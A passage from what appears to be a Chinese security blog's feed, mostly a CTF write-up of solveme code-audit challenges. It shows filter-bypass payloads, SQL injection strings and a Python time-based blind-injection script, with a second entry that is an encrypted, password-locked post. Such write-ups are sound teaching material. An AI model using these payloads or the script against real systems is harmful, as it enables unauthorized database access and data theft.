这里，这个可以匹配任意字符，但是不可以匹配换行，而 <code>^$</code> 又限制了字符串必须在同一行，所以绕过就简单了，payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://replacefilter.solveme.peng.kr/?say=%0agive_me_the_flag</span><br></pre></td></tr></table></figure><h1 id="Hell-JS"><a href="#Hell-JS" class="headerlink" title="Hell JS"></a>Hell JS</h1><h1 id="Anti-SQLi"><a href="#Anti-SQLi" class="headerlink" title="Anti SQLi"></a>Anti SQLi</h1><p>关键过滤如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">preg_match(</span><br><span class="line">           <span class="string">'/\.|\`|"|\'|\\|\xA0|\x0B|0x0C|\t|\r|\n|\0|'</span>.</span><br><span class="line">           <span class="string">'=|&lt;|&gt;|\(|\)|@@|\|\||&amp;&amp;|#|\/\*.*\*\/|--[\s\xA0]|'</span>.</span><br><span class="line">           <span class="string">'0x[0-9a-f]+|0b[01]+|x\'[0-9a-f]+\'|b\'[01]+\'|'</span>.</span><br><span class="line">           <span class="string">'[\s\xA0\'"]+(as|or|and|r*like|regexp)[\s\xA0\'"]+|'</span>.</span><br><span class="line">           <span class="string">'union[\s\xA0]+select|[\s\xA0](where|having)|'</span>.</span><br><span class="line">           <span class="string">'[\s\xA0](group|order)[\s\xA0]+by|limit[\s\xA0]+\d|'</span>.</span><br><span class="line">           <span class="string">'information_schema|procedure\s+analyse\s*/is'</span>,</span><br><span class="line">           $id.<span class="string">','</span>.$pw</span><br><span class="line">       ) <span class="keyword">and</span> <span class="keyword">die</span>(<span class="string">'Hack detected'</span>);</span><br></pre></td></tr></table></figure><p>sql语句即判断条件<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$result = mysqli_fetch_array(</span><br><span class="line">            mysqli_query(</span><br><span class="line">                $con, </span><br><span class="line">                <span class="string">"SELECT * FROM `antisqli` WHERE `id`='&#123;$id&#125;' AND `pw`=md5('&#123;$pw&#125;');"</span></span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        mysqli_close($con);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($result))&#123;</span><br><span class="line">            <span class="keyword">if</span>($result[<span class="string">'no'</span>] === <span class="string">'31337'</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> $flag;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'Hello, '</span>, $result[<span class="string">'id'</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Login failed'</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><p>该正则匹配中 <code>|\\|</code> 是无法匹配到 <code>\</code> 的，必须要用四个才可以，所以这道题目中 \ 是可以用的，用 <code>id=\</code> 可以成功吃掉一个引号。<br>正则中 <code>union[\s\xA0]+select</code> 还可考虑用 <code>union all select</code> 绕过，正则 <code>--[\s\xA0]</code> ，其中查资料发现</p><blockquote><p>\s :匹配任何不可见字符，包括空格、制表符、换页符等等。等价于[\f\n\r\t\v]</p></blockquote><p>也就是说还有其它字符可以匹配，例如 <code>%01,%11,%02</code> ，基于以上内容可以构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1\&amp;pw=union all select 1222,212,12 from antisqli--%10</span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1\&amp;pw=union all select 31337,2,3 from antisqli--%10</span><br></pre></td></tr></table></figure><h1 id="Name-Check"><a href="#Name-Check" class="headerlink" title="Name Check"></a>Name Check</h1><p>关键过滤如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/admin|--|;|\(\)|\/\*|\\0/i"</span>, $name))</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$res = $sql-&gt;query(<span class="string">"</span></span><br><span class="line"><span class="string">            SELECT </span></span><br><span class="line"><span class="string">            MAX('0','1','&#123;$name&#125;') LIKE 'a%', </span></span><br><span class="line"><span class="string">            INSTR('&#123;$name&#125;','d')&gt;0, </span></span><br><span class="line"><span class="string">            MIN('&#123;$name&#125;','b','c') LIKE '__m__', </span></span><br><span class="line"><span class="string">            SUBSTR('&#123;$name&#125;',-2)='in'</span></span><br><span class="line"><span class="string">        ;"</span>);</span><br><span class="line">        <span class="keyword">if</span>($res === <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Database error'</span>;</span><br><span class="line">            <span class="keyword">goto</span> quit;</span><br><span class="line">        &#125;</span><br><span class="line">        $row = $res-&gt;fetchArray(SQLITE3_NUM);</span><br><span class="line">        <span class="keyword">if</span>(</span><br><span class="line">            $row[<span class="number">0</span>] + $row[<span class="number">1</span>] + $row[<span class="number">2</span>] + $row[<span class="number">3</span>] !== <span class="number">4</span> ||</span><br><span class="line">            array_sum($row) !== <span class="number">4</span> </span><br><span class="line">        )&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Auth failed'</span>;</span><br><span class="line">            <span class="keyword">goto</span> quit;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br></pre></td></tr></table></figure><p>看代码可知题目应该是要求四个选择条件都成立，按照题目要求应该就是输入admin才可以，但是题目过滤了admin，查阅sqlite发现，它在连接字符串的时候用的是 <code>||</code> 而不是 <code>+</code> ，所以payload： <code>?name=ad&#39;||&#39;min</code> </p><h1 id="I-am-slowly"><a href="#I-am-slowly" class="headerlink" title="I am slowly"></a>I am slowly</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($answer))&#123;</span><br><span class="line">    $con = mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname)</span><br><span class="line">        <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'SQL server down'</span>);</span><br><span class="line"></span><br><span class="line">    $result = mysqli_fetch_array(</span><br><span class="line">        mysqli_query($con, <span class="string">"SELECT `count` FROM `&#123;$table&#125;`;"</span>)</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($result))&#123;</span><br><span class="line">        mysqli_query($con, <span class="string">"CREATE TABLE IF NOT EXISTS `&#123;$table&#125;` (`answer` char(32) NOT NULL, `count` int(4) NOT NULL);"</span>);</span><br><span class="line">        $new_answer = md5(sha1(<span class="string">'iamslowly_'</span>.mt_rand().<span class="string">'_'</span>.mt_rand().<span class="string">'_'</span>.mt_rand()));</span><br><span class="line">        mysqli_query($con, <span class="string">"INSERT INTO `&#123;$table&#125;` (`answer`,`count`) VALUES ('&#123;$new_answer&#125;',1);"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">elseif</span>($result[<span class="string">'count'</span>] === <span class="string">'12'</span>)&#123;</span><br><span class="line">        mysqli_query($con, <span class="string">"DROP TABLE `&#123;$table&#125;`;"</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Game over'</span>;</span><br><span class="line">        <span class="keyword">goto</span> quit;</span><br><span class="line">    &#125;</span><br><span class="line">    $randtime = mt_rand(<span class="number">1</span>, <span class="number">10</span>);</span><br><span class="line">    $result = mysqli_fetch_array(</span><br><span class="line">        mysqli_query($con, <span class="string">"SELECT * FROM `&#123;$table&#125;` WHERE sleep(&#123;$randtime&#125;) OR `answer`='&#123;$answer&#125;';"</span>)</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($result) &amp;&amp; $result[<span class="string">'answer'</span>] === $answer)&#123;</span><br><span class="line">        mysqli_query($con, <span class="string">"DROP TABLE `&#123;$table&#125;`;"</span>);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        mysqli_query($con, <span class="string">"UPDATE `&#123;$table&#125;` SET `count`=`count`+1;"</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Go fast'</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>代码大概流程大概count=12或者table不存在的时候就建立新表重置count次数，然后知道answer相同时才会输出flag，限定了每轮只能尝试12次，之后answer就会变化且重置次数，但是题目存在逻辑漏洞，题目关键顺序是：</p><blockquote><p>判断count的值—&gt;执行SQL语句—&gt;加count值</p></blockquote><p>按照这个逻辑顺序，当count=11的时候，我们执行一个sleep()时间很长的语句，该请求就会长时间停在 <code>执行SQL语句</code> 流程中，如果此时我们再发起一次正常请求，判断count值还是11，执行完SQL语句之后count+1=12，再当上一条SQL语句执行完毕后count再加1等于13，于是之后就可以无限制提交请求了，然后在利用盲注来获得answer</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">keys = <span class="string">'0123456789abcdef'</span></span><br><span class="line">header = &#123;</span><br><span class="line"><span class="string">"Host"</span>:<span class="string">"iamslowly.thinkout.rf.gd"</span>,</span><br><span class="line"><span class="string">"Cache-Control"</span>:<span class="string">"max-age=0"</span>,</span><br><span class="line"><span class="string">"Upgrade-Insecure-Requests"</span>:<span class="string">"1"</span>,</span><br><span class="line"><span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36"</span>,</span><br><span class="line"><span class="string">"Accept"</span>:<span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"</span>,</span><br><span class="line"><span class="string">"Referer"</span>:<span class="string">"http://solveme.peng.kr/chall"</span>,</span><br><span class="line"><span class="string">"Accept-Language"</span>:<span class="string">"zh-CN,zh;q=0.8"</span>,</span><br><span class="line"><span class="string">"Cookie"</span>:<span class="string">"__test=8f5247d83ccd8573674837d6f9a37fd1"</span></span><br><span class="line">&#125;</span><br><span class="line">payload = <span class="string">'440763269e2fe7a672a52ea827728'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> keys:</span><br><span class="line">        url = <span class="string">"http://iamslowly.thinkout.rf.gd/?i=1&amp;answer=' or if((answer like '&#123;&#125;%'),sleep(50),2)%23"</span>.format(payload + j)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            content = requests.get(url,headers=header,timeout=<span class="number">30</span>).content</span><br><span class="line">            print(content[:<span class="number">10</span>])</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            payload += j</span><br><span class="line">            print(payload)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>这题目盲注时间有点长，这里贴一下结果 <code>440763269e2fe7a672a52ea827728539</code> 。</p><h1 id="Check-via-eval"><a href="#Check-via-eval" class="headerlink" title="Check via eval"></a>Check via eval</h1><p>主要代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$exam = <span class="string">'return\''</span>.sha1(time()).<span class="string">'\';'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="./?flag='</span>.$exam.<span class="string">'"&gt;Click here&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">'flag'</span>]) != strlen($exam)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Not allowed length'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">'/`|"|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit/is'</span>, $_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Not allowed keyword'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">eval</span>($_GET[<span class="string">'flag'</span>]) === sha1($flag)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目过滤了括号，也基本过滤完了能用的函数，所以思路就是在 <code>eval($_GET[&#39;flag&#39;])</code> 中让其直接输出flag，虽然题目过滤了flag，但是PHP文档中有如下内容 <a href="http://php.net/manual/zh/language.basic-syntax.phpmode.php" target="_blank" rel="noopener">Click Here</a> ，也就是说可以用 <code>&lt;?= expression?&gt;</code> 来达到绕过 <code>echo</code> 过滤的目的。</p><p>我们可以构造 <code>&lt;?= flag?&gt;</code> 来输出flag，尝试构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a=&apos;alag&apos;;$a&#123;0&#125;=&apos;f&apos;;?&gt;11111111111111111;&lt;?=$$a;?&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近在学长的建议下开始做solveme网站的题目，都是代码审计的题目，学到了很多的东西，记录一下&lt;/p&gt;
    
    </summary>
    
      <category term="writeup" scheme="http://chaosec.top/categories/writeup/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>萌宠养成记</title>
    <link href="http://chaosec.top/2018/07/24/Train-my-pet/"/>
    <id>http://chaosec.top/2018/07/24/Train-my-pet/</id>
    <published>2018-07-24T10:35:04.000Z</published>
    <updated>2019-02-16T08:30:33.612Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="What's my pet's name?" />    <label for="pass">What's my pet's name?</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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